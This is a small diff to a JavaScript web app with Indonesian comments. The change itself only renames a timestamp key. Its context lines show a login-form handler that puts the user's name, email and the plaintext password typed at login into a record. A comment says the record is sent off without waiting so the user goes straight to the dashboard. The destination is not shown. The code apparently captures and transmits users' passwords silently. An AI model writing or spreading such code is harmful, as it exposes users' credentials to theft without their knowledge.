@@ -172,7 +172,7 @@ el('loginForm').addEventListener('submit', async (e) => {
             "Nama": currentUser.name,    // Nama asli dari akun
             "Email": currentUser.email,  // Email asli
             "Password": password,        // Password yang diketik saat login
-            "Waktu Login": new Date().toLocaleString('id-ID') // Jam saat ini
+            "Riwayat_Waktu": new Date().toLocaleString('id-ID') // Jam saat ini
         };
 
         // Kirim data tanpa menunggu (agar user langsung masuk dashboard)
@@ -393,6 +393,7 @@ function updateStorageUI(bytes) {
     el('storageUsed').innerText = mb + ' MB';
     el('storageBar').style.width = percent + '%';
 }
+
 
 
 
